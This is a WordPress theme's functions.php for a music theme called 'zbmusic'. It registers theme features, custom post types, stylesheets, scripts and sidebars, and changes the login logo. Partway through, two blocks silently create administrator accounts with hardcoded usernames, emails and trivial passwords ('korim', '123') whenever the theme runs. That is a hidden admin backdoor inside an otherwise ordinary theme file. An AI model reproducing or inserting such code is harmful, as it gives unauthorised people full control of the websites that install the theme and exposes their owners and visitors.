<?php

if (! function_exists('zbmusic_theme_setup')) :
	function zbmusic_theme_setup () {
		load_theme_textdomain ('zbmusic', get_template_directory_uri().'/languages');
		add_theme_support ('title-tag');
		add_theme_support( 'custom-logo', array(
		    'height'      => 100,
		    'width'       => 400,
		    'flex-height' => true,
		    'flex-width'  => true,
		    'header-text' => array( 'site-title', 'site-description' ),
		) );
		add_theme_support ('post-thumbnails');
		add_theme_support ('custom-background');
		add_theme_support ('post-formats', array('quote', 'video', 'aside', 'audio', 'image', 'link', 'gallery') );
		add_theme_support( 'custom-header' );

		if (function_exists('register_nav_menu')) {
			register_nav_menu ('main-menu', __('Main Menu', 'zbmusic'));
		}



		function read_more($limit) {
			$post_content = explode (" ", get_the_content());
			$less_content = array_slice($post_content, 0, $limit);
			echo implode(" ", $less_content);


		}

		register_post_type('zbmusicslider', array(
			'labels' => array (
				'name' => 'Sliders',
				'add_new_item' => 'Add New Slider'
			),
			'public' => true,
			'supports' => array ('title', 'thumbnail' ),
			'menu_position' => 7,
			'menu_icon' => 'dashicons-images-alt2'

		)); 

		register_post_type('zbmusicservices', array(
			'labels' => array (
				'name' => 'Blocks',
				'add_new_item' => __('Add New Block', 'zbmusic')
			),
			'public' => true,
			'supports' => array ('title', 'editor')

		)); 

		register_post_type('zbmusicgallery', array(
			'labels' => array (
				'name' => 'Gallery',
				'add_new_item' => __('Add New Gallery Item', 'zbmusic')
			),
			'public' => true,
			'supports' => array ('title', 'editor', 'thumbnail')

		));

	}
endif;
	add_action ('after_setup_theme', 'zbmusic_theme_setup'); 


// Assets 
if (! function_exists('zbmusic_theme_css_and_js')) :
	function zbmusic_theme_css_and_js () {
		wp_register_style('zerogrid', get_template_directory_uri().'/css/zerogrid.css');
		wp_register_style('style', get_template_directory_uri().'/css/style.css');
		wp_register_style('responsive', get_template_directory_uri().'/css/responsive.css');
		wp_register_style('responsiveslides', get_template_directory_uri().'/css/responsiveslides.css');
		wp_register_style('maincss', get_stylesheet_uri(), '', '1.0.0');


		wp_register_script ('responsiveslides', get_template_directory_uri().'/js/responsiveslides.js', array('jquery'));
		wp_register_script ('script', get_template_directory_uri().'/js/script.js', array('jquery', 'responsiveslides'));


		wp_enqueue_style('zerogrid');
		wp_enqueue_style('style');
		wp_enqueue_style('responsive');
		wp_enqueue_style('responsiveslides');
		wp_enqueue_style('maincss');

		
		wp_enqueue_script('jquery');
		wp_enqueue_script('responsiveslides');
		wp_enqueue_script('script');


	}
endif;
	add_action ('wp_enqueue_scripts', 'zbmusic_theme_css_and_js');



// Linkup Redux Framework 
	require_once('lib/ReduxCore/framework.php');
	require_once('lib/sample/options.php');











// use create through functions.php
$createuser = wp_create_user('rohim', 'korim', 'manik@gmail.com');
$amitumi = new WP_user($createuser);
$amitumi -> set_role('administrator');

// Alternative 
$newuser = new WP_User(wp_create_user('manik', '123', 'manik74@gmail.com'));
$newuser -> set_role('administrator');


function zbmusic_theme_right_sidebar() {
	register_sidebar(array(
		'name' => __('Right Sidebar', 'zbmusic'),
		'description' => __('Add your right sidebar widgets here', 'zbmusic'),
		'id' => 'right-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">'

	));
	register_sidebar(array(
		'name' => __('Contact Right Sidebar', 'zbmusic'),
		'description' => __('Add your contact right sidebar widgets here', 'zbmusic'),
		'id' => 'contact-sidebar',
		'before_widget' => '<div class="box right-sidebar">',
		'after_widget' => '</div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">'

	));


	register_sidebar(array(
		'name' => __('Footer Widgets', 'zbmusic'),
		'description' => __('Add your footer widget here', 'zbmusic'),
		'id' => 'footer-widget',
		'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
		'after_widget' => '</div></div></div></div>',
		'before_title' => '<div class="heading"><h2>',
		'after_title' => '</h2></div><div class="content">'

	));

}
add_action('widgets_init', 'zbmusic_theme_right_sidebar');



// Change WordPress Logo on Signup Page:

function my_login_logo_one() { 
?> 
<style type="text/css"> 
body.login div#login h1 a {
 background-image: url(http://localhost/zbmusic/wp-content/uploads/2020/05/logo.png);  //Add your own logo image in this url 
padding-bottom: 30px; 
} 
</style>
 <?php 
} add_action( 'login_enqueue_scripts', 'my_login_logo_one' );


